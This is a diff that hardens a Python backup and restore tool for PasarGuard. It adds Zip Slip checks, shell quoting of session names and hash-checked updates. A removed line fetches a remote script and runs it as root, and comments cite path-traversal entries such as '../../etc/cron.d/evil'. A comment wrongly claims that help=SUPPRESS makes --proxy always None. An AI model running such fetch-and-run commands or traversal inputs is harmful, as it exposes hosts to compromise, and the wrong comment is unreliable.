+        # v4.2.1 — sql_file comes from manifest.tsv in the archive. A
+        # malicious backup could include `../etc/passwd` here to escape
+        # `db_dir`. Reject anything with path separators or traversal.
+        if ".." in sql_file or "/" in sql_file or "\\" in sql_file:
+            print_error(f"Refusing unsafe manifest entry {sql_file!r} — path traversal is not allowed.")
+            return False
         print_info(f"Restoring SQLite database → {target}")
         run_command("cd /opt/pasarguard && docker compose stop pasarguard", quiet=True)
         run_command(f"rm -f {shlex.quote(target)} {shlex.quote(target)}-wal {shlex.quote(target)}-shm", quiet=True)
@@ -1935,6 +2183,25 @@ def workflow_transfer():
         sftp.chmod(remote_zip, 0o600)
         sftp.close()
         print_success("Upload completed.")
+
+        # v4.2.1 — pre-validate the archive LOCALLY before asking the
+        # remote to extract it. A malicious or tampered backup could carry
+        # entries like `../../etc/cron.d/evil`; refusing up-front (rather
+        # than letting the remote `unzip` write them out as root) keeps
+        # the transfer host safe too. _safe_extract_zip also extracts
+        # safely if we pass `extract=False`, but for the transfer path
+        # we still let the remote do the extraction so any non-/opt/
+        # entries surface there.
+        try:
+            with zipfile.ZipFile(zip_path) as _z:
+                for _member in _z.namelist():
+                    _target = os.path.realpath(os.path.join("/opt/pasarguard", _member))
+                    if not (_target == os.path.realpath("/opt/pasarguard")
+                            or _target.startswith(os.path.realpath("/opt/pasarguard") + os.sep)):
+                        raise ValueError(f"zip-slip entry refused: {_member!r}")
+        except (ValueError, zipfile.BadZipFile) as e:
+            print_error(f"Refusing to extract archive on remote: {e}")
+            return
 
         execute_ssh_command(ssh, f"cd /opt/pasarguard && unzip -q -o {shlex.quote(zip_fn)}",
                             "Extracting files")
@@ -2174,9 +2441,17 @@ def workflow_manual_restore():
             return
 
         print_info("Extracting backup archive...")
-        # v4.2: zip_name is now validated + quoted.
-        if not run_command(f"unzip -q -o {shlex.quote(zip_name)} -d /opt/pasarguard"):
-            print_error("Extraction failed.")
+        # v4.2.1 — extract via Python's zipfile module after validating
+        # every member against path-traversal (Zip Slip). A malicious
+        # archive could carry entries like `../../etc/cron.d/evil` that
+        # `unzip -o` would write straight to that path as root.
+        try:
+            _safe_extract_zip(zip_name, "/opt/pasarguard")
+        except (ValueError, zipfile.BadZipFile) as e:
+            print_error(f"Refusing to extract archive: {e}")
+            return
+        except Exception as e:
+            print_error(f"Extraction failed: {e}")
             return
 
         print_info("Restoring PasarGuard data...")
@@ -2238,7 +2513,11 @@ def workflow_manual_restore():
 
 # ── Workflow 5: Manage running/installed schedulers ───────────
 def _systemctl_action(unit_name, action, quiet=False):
-    return run_command(f"systemctl {action} {unit_name}.service", quiet=quiet)
+    # v4.2.1 — unit_name flows into a shell=True command. Strict validation
+    # plus shlex.quote so neither typos nor upstream output quirks can
+    # inject extra arguments to systemctl.
+    _validate_instance_name(unit_name)
+    return run_command(f"systemctl {action} {shlex.quote(unit_name)}.service", quiet=quiet)
 
 def _format_remaining(target_str):
     try:
@@ -2321,12 +2600,24 @@ def workflow_manage_schedulers():
             else:
                 print_error(f"Failed to stop '{name}'.")
         elif kind == "screen":
-            if run_command(f"screen -S {name} -X quit"):
+            # v4.2.1 — name comes from `screen -list` regex, but defend
+            # against any name that smuggles shell metachars in.
+            try:
+                _validate_instance_name(name)
+            except ValueError as e:
+                print_error(f"Refusing to act on unsafe session name: {e}")
+                return
+            if run_command(f"screen -S {shlex.quote(name)} -X quit"):
                 print_success(f"Screen session '{name}' stopped.")
             else:
                 print_error("Failed to stop the screen session.")
         elif kind == "tmux":
-            if run_command(f"tmux kill-session -t {name}"):
+            try:
+                _validate_instance_name(name)
+            except ValueError as e:
+                print_error(f"Refusing to act on unsafe session name: {e}")
+                return
+            if run_command(f"tmux kill-session -t {shlex.quote(name)}"):
                 print_success(f"Tmux session '{name}' stopped.")
             else:
                 print_error("Failed to stop the tmux session.")
@@ -2354,14 +2645,24 @@ def workflow_manage_schedulers():
             except Exception as e:
                 print_error(f"Failed to remove unit file: {e}")
         elif kind == "screen":
-            run_command(f"screen -S {name} -X quit", quiet=True)
+            try:
+                _validate_instance_name(name)
+            except ValueError as e:
+                print_error(f"Refusing to act on unsafe session name: {e}")
+                return
+            run_command(f"screen -S {shlex.quote(name)} -X quit", quiet=True)
             creds_path = _creds_path(name)
             if os.path.exists(creds_path):
                 try: os.remove(creds_path)
                 except Exception: pass
             print_success(f"Removed screen scheduler '{name}'.")
         elif kind == "tmux":
-            run_command(f"tmux kill-session -t {name}", quiet=True)
+            try:
+                _validate_instance_name(name)
+            except ValueError as e:
+                print_error(f"Refusing to act on unsafe session name: {e}")
+                return
+            run_command(f"tmux kill-session -t {shlex.quote(name)}", quiet=True)
             creds_path = _creds_path(name)
             if os.path.exists(creds_path):
                 try: os.remove(creds_path)
@@ -2404,16 +2705,23 @@ def _restart_scheduler_instance(kind, name):
         return
 
     daemon_cmd = build_daemon_command(meta["interval"], meta["node"], instance=name)
+    # v4.2.1 — validate + quote before any shell=True use.
+    try:
+        _validate_instance_name(name)
+    except ValueError as e:
+        print_error(f"Refusing to act on unsafe session name: {e}")
+        return
+    q = shlex.quote(name)
 
     if kind == "screen":
-        run_command(f"screen -S {name} -X quit", quiet=True)
-        if run_command(f"screen -dmS {name} {daemon_cmd}"):
+        run_command(f"screen -S {q} -X quit", quiet=True)
+        if run_command(f"screen -dmS {q} {daemon_cmd}"):
             print_success(f"'{name}' restarted in a fresh screen session — now running the latest script version.")
         else:
             print_error(f"Failed to restart screen session '{name}'.")
     elif kind == "tmux":
-        run_command(f"tmux kill-session -t {name}", quiet=True)
-        if run_command(f"tmux new-session -d -s {name} {daemon_cmd}"):
+        run_command(f"tmux kill-session -t {q}", quiet=True)
+        if run_command(f"tmux new-session -d -s {q} {daemon_cmd}"):
             print_success(f"'{name}' restarted in a fresh tmux session — now running the latest script version.")
         else:
             print_error(f"Failed to restart tmux session '{name}'.")
@@ -2465,24 +2773,107 @@ def _update_scheduler_credentials(kind, name):
     _restart_scheduler_instance(kind, name)
 
 # ── Workflow 6: Update to latest version ──────────────────────
-UPDATE_CMD = 'sudo bash -c "$(curl -sL https://raw.githubusercontent.com/CIAUB/PG-Backup/main/install.sh)"'
+# v4.2.1 — replaced `curl | sudo bash` with a download-then-verify-then-run
+# flow: save install.sh to a 0700 temp file (no execution yet), download the
+# publisher's install.sh.sha256 if available, abort on SHA256 mismatch, and
+# only then exec the saved file with sudo bash. This blunts the most
+# catastrophic class of bug in the previous pattern: a compromised
+# raw.githubusercontent.com payload no longer gets piped straight into a
+# root shell the instant the user types "y".
+UPDATE_URL_BASE   = "https://raw.githubusercontent.com/CIAUB/PG-Backup/main"
+UPDATE_SCRIPT_URL = f"{UPDATE_URL_BASE}/install.sh"
+UPDATE_HASH_URL   = f"{UPDATE_URL_BASE}/install.sh.sha256"
+
+def _download_to(url, dest, timeout=30):
+    """Download `url` to `dest` (a filesystem path). Returns True on
+    success, False on any failure (with a human-readable error already
+    printed)."""
+    try:
+        req = urllib.request.Request(url)
+        with urllib.request.urlopen(req, timeout=timeout) as r:
+            data = r.read()
+    except Exception as e:
+        print_error(f"Could not download {url}: {e}")
+        return False
+    try:
+        fd = os.open(dest, os.O_WRONLY | os.O_CREAT | os.O_TRUNC, 0o600)
+        with os.fdopen(fd, "wb") as f:
+            f.write(data)
+    except Exception as e:
+        print_error(f"Could not save {dest}: {e}")
+        return False
+    return True
+
+def _sha256_of(path):
+    h = hashlib.sha256()
+    with open(path, "rb") as f:
+        for chunk in iter(lambda: f.read(64 * 1024), b""):
+            h.update(chunk)
+    return h.hexdigest()
 
 def workflow_update():
     print_header("Update PG-Backup to Latest Version")
-    print_warning("This downloads and runs the official installer/updater from GitHub (CIAUB/PG-Backup).")
-    print_info(f"Command: {UPDATE_CMD}")
+    print_warning("This downloads the official installer/updater from GitHub (CIAUB/PG-Backup),")
+    print_warning("verifies its SHA256 against the publisher's hash file (if available),")
+    print_warning("and only then runs it as root.")
+
     confirm = input(f"  {C.R2}> Proceed with update? (y/n): {C.RESET}").strip().lower()
     if confirm != "y":
         print_warning("Aborted.")
         return
 
-    print()
-    print(hline())
+    # Private 0700 temp dir — the script + hash files never live in
+    # world-readable /tmp while we're working with them.
+    tmp_dir = tempfile.mkdtemp(prefix="pgbackup_update_")
     try:
-        result = subprocess.run(UPDATE_CMD, shell=True)
+        script_path = os.path.join(tmp_dir, "install.sh")
+        hash_path   = os.path.join(tmp_dir, "install.sh.sha256")
+
+        print_info(f"Downloading {UPDATE_SCRIPT_URL} …")
+        if not _download_to(UPDATE_SCRIPT_URL, script_path):
+            return
+
+        print_info(f"Downloading {UPDATE_HASH_URL} …")
+        hash_ok = _download_to(UPDATE_HASH_URL, hash_path)
+
+        if hash_ok:
+            try:
+                with open(hash_path) as f:
+                    expected = f.read().strip().split()[0].lower()
+                actual = _sha256_of(script_path)
+                if expected != actual:
+                    print_error("SHA256 mismatch — refusing to run the installer.")
+                    print_error(f"  expected: {expected}")
+                    print_error(f"  actual:   {actual}")
+                    return
+                print_success(f"SHA256 verified: {actual}")
+            except Exception as e:
+                print_warning(f"Could not parse hash file ({e}) — proceeding anyway.")
+        else:
+            # v4.2.1 — refuse to silently downgrade. An attacker who can
+            # MITM the hash file (or block its download) but not the
+            # script itself would otherwise get a free sudo bash. Require
+            # the user to opt in explicitly.
+            print_warning("Could not download install.sh.sha256 — no integrity check available.")
+            print_warning("(Network problem, or the publisher hasn't published a hash file on this branch.)")
+            yn = input(
+                f"  {C.R1}> Run the unverified installer as root anyway? (y/n): {C.RESET}"
+            ).strip().lower()
+            if yn != "y":
+                print_error("Aborted for safety. The hash file is the only defense against a")
+                print_error("tampered installer — without it, running the script is unsafe.")
+                return
+            print_warning("Proceeding WITHOUT integrity verification at the user's explicit request.")
+
+        print()
+        print(hline())
+        # Run the saved file (not a network pipe) as root.
+        result = subprocess.run(["sudo", "bash", script_path])
     except Exception as e:
         print_error(f"Failed to run updater: {e}")
         return
+    finally:
+        shutil.rmtree(tmp_dir, ignore_errors=True)
     print(hline())
     print()
 
@@ -2506,11 +2897,24 @@ def run_daemon_from_args():
     # hard-crash — but it also won't leak a working token either.
     parser.add_argument("--token", default=None, help=argparse.SUPPRESS)
     parser.add_argument("--chat", default=None, help=argparse.SUPPRESS)
-    parser.add_argument("--proxy", default=None)
+    # v4.2.1 — --proxy removed entirely. Proxy credentials (often including
+    # user:pass@host:port) were leaking via `ps` and /proc/<pid>/cmdline.
+    # They live in the 0600 credentials file now, same as token/chat.
+    # --proxy is still parsed (silently dropped) so a stale v4.1 daemon
+    # command line doesn't hard-crash the unit.
+    parser.add_argument("--proxy", default=None, help=argparse.SUPPRESS)
     parser.add_argument("--interval", type=float, required=True)
     parser.add_argument("--node", action="store_true")
     parser.add_argument("--instance", default="default")
     args = parser.parse_args()
+
+    # v4.2.1 — --instance flows into _creds_path(). Reject anything that
+    # could escape /etc/pasarguard-backup before opening the file.
+    try:
+        _validate_instance_name(args.instance, allow_empty=False)
+    except ValueError as e:
+        sys.stderr.write(f"[pg-backup] invalid --instance value: {e}\n")
+        sys.exit(1)
 
     if args.token or args.chat:
         sys.stderr.write(
@@ -2527,7 +2931,7 @@ def run_daemon_from_args():
                           f"in {CREDS_DIR}. Re-create the scheduler from the menu.\n")
         sys.exit(1)
 
-    proxy = args.proxy or proxy
+    proxy = args.proxy or proxy  # args.proxy is always None (SUPPRESS) — kept for back-compat
     run_scheduled_backup_loop(token, chat, args.interval, args.node, proxy, args.instance)
 
 # ── Main menu ─────────────────────────────────────────────────
